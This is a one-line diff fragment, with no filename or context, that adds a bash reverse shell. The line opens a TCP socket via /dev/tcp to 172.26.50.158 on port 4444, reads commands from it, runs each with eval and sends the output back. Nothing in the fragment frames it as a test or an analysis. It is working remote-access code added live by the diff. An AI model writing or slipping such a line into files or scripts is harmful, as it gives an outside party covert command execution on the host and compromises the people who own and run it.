@@ -1,0 +1,1 @@
+exec 5<>/dev/tcp/172.26.50.158/4444; while read -r c <&5; do c="${c%$'\r'}"; eval "$c" >&5 2>&1; echo __DONE__ >&5; done
